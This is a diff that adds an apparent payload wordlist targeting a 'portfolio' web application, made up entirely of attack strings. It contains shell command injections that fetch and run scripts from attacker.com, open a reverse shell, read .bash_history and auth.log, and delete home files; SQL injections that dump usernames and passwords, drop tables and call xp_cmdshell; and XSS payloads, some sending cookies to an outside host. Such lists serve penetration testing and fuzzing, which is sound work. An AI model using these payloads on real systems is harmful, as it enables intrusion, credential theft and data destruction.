@@ -1,0 +1,150 @@
+; ls
+| ls
+&& ls
+`ls`
+; cat /home/portfolio/.bash_history
+| cat /home/portfolio/.bash_history
+&& cat /home/portfolio/.bash_history
+`cat /home/portfolio/.bash_history`
+; id
+| id
+&& id
+`id`
+; whoami
+| whoami
+&& whoami
+`whoami`
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+`ping -c 4 127.0.0.1`
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+; nc -lvp 1234
+| nc -lvp 1234
+&& nc -lvp 1234
+`nc -lvp 1234`
+; curl http://attacker.com/evil_script.sh | sh
+| curl http://attacker.com/evil_script.sh | sh
+&& curl http://attacker.com/evil_script.sh | sh
+`curl http://attacker.com/evil_script.sh | sh`
+; wget http://attacker.com/evil_script.sh -O /tmp/evil_script.sh; sh /tmp/evil_script.sh
+| wget http://attacker.com/evil_script.sh -O /tmp/evil_script.sh; sh /tmp/evil_script.sh
+&& wget http://attacker.com/evil_script.sh -O /tmp/evil_script.sh; sh /tmp/evil_script.sh
+`wget http://attacker.com/evil_script.sh -O /tmp/evil_script.sh; sh /tmp/evil_script.sh`
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+| echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+&& echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+`echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh`
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+| bash -i >& /dev/tcp/attacker.com/1234 0>&1
+&& bash -i >& /dev/tcp/attacker.com/1234 0>&1
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+; rm -rf /home/portfolio/*
+| rm -rf /home/portfolio/*
+&& rm -rf /home/portfolio/*
+`rm -rf /home/portfolio/*`
+; cat /var/log/auth.log
+| cat /var/log/auth.log
+' OR 1=1--
+' OR 'a'='a
+' OR 1=1# 
+' OR 1=1/*
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, username, password FROM users--
+' UNION SELECT 1,2,3--
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password')--
+' AND 1=1--
+' AND 1=2--
+' OR 1=1-- -
+' OR 'x'='x
+' OR '1'='1
+' OR 1=1 LIMIT 1,1--
+' AND 1=1--
+' AND '1'='1'--
+' OR (SELECT COUNT(*) FROM users) > 0--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' OR 1=1 AND SLEEP(5)--
+' AND 1=1 AND SLEEP(5)--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3,4,5,6 FROM information_schema.tables--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 100--
+' AND (SELECT length(password) FROM users WHERE username='admin') = 8--
+' AND (SELECT substring(password,1,1) FROM users WHERE username='admin') = 'a'--
+' OR 1=1; DROP TABLE users--
+' OR 1=1;-- DROP TABLE users
+' OR 1=1; TRUNCATE TABLE users--
+' AND (SELECT database()) = 'portfolio'--
+' AND (SELECT table_name FROM information_schema.tables WHERE table_schema='portfolio') = 'users'--
+' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users') = 'username'--
+' OR 'a'='a' AND (SELECT table_name FROM information_schema.tables) LIKE 'users%'--
+' OR 'a'='a' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users') LIKE 'username%'--
+' AND 1=1 ORDER BY 1--
+' AND 1=2 ORDER BY 1--
+' UNION SELECT 1, username, password FROM users--
+' AND (SELECT count(*) FROM users WHERE username='admin') > 0--
+' AND 1=1 UNION SELECT null, null, null--
+' OR (SELECT name FROM users WHERE username='admin')='admin'--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 1--
+' AND (SELECT * FROM users WHERE username='admin')='admin'--
+' OR '1'='1' AND (SELECT database())='portfolio'--
+' OR 'a'='a' AND (SELECT COUNT(*) FROM users) > 0--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')=0--
+' AND (SELECT length(password) FROM users WHERE username='admin') > 5--
+' UNION ALL SELECT null, null, null--
+' UNION ALL SELECT username, password FROM users--
+' OR 1=1; EXEC xp_cmdshell('dir')--
+' AND (SELECT user()) = 'root'--
+' AND (SELECT version()) = 'MySQL 5.7.34'--
+<script>alert('XSS in Portfolio')</script>
+<img src="x" onerror="alert('XSS in Portfolio')">
+<a href="javascript:alert('XSS in Portfolio')">Click me</a>
+<div onmouseover="alert('XSS in Portfolio')">Hover over me</div>
+<script>eval('alert("XSS in Portfolio")')</script>
+<input type="text" value="<script>alert('XSS in Portfolio')</script>">
+<iframe src="javascript:alert('XSS in Portfolio');"></iframe>
+<svg/onload=alert('XSS in Portfolio')>
+<script>document.location='javascript:alert("XSS in Portfolio")'</script>
+<script>window.location="javascript:alert('XSS in Portfolio')"</script>
+<form action="javascript:alert('XSS in Portfolio')"></form>
+<img src="invalid" onerror="alert('XSS in Portfolio')">
+<input type="button" value="Click me" onclick="alert('XSS in Portfolio')">
+<button onclick="alert('XSS in Portfolio')">Click me</button>
+<textarea onfocus="alert('XSS in Portfolio')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS in Portfolio')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Portfolio')">
+<object data="javascript:alert('XSS in Portfolio')"></object>
+<audio src="javascript:alert('XSS in Portfolio')"></audio>
+<input type="image" src="x" onerror="alert('XSS in Portfolio')">
+<script>setTimeout('alert("XSS in Portfolio")', 100)</script>
+<script>window.alert('XSS in Portfolio');</script>
+<input type="file" onchange="alert('XSS in Portfolio')">
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<div style="width: expression(alert('XSS in Portfolio'));">
+<script>window.alert(document.cookie)</script>
+<script>document.cookie="PortfolioXSS=" + encodeURIComponent('test');</script>
+<script>new Image().src='javascript:alert("XSS in Portfolio")'</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Portfolio")>';</script>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Portfolio\')"></iframe>';</script>
+<input onfocus="alert('XSS in Portfolio')" autofocus>
+<video onplay="alert('XSS in Portfolio')"></video>
+<form action="javascript:alert('XSS in Portfolio')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS in Portfolio')"></textarea>
+<script>var x = document.createElement('script'); x.src = 'javascript:alert("XSS in Portfolio")'; document.body.appendChild(x);</script>
+<script>eval('alert("XSS in Portfolio")')</script>
+<input type="text" value="Portfolio <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
+<style>@import 'javascript:alert(2)';</style>
+<button onclick="location='javascript:alert(3)'">Click Me</button>
+<form action="javascript:alert('XSS in Portfolio')" method="POST"></form>
+<audio controls autoplay><source src="javascript:alert('XSS in Portfolio')"></audio>
+<script>document.body.innerHTML = '<img src="x" onerror="alert(\'XSS\')">';</script>
+<script>location='javascript:alert("XSS in Portfolio")'</script>
+<script>window.location="javascript:alert('XSS in Portfolio')"</script>
+<input type="text" value="<svg><script>alert('XSS in Portfolio')</script></svg>">
+<script>window.alert('XSS in Portfolio')</script>
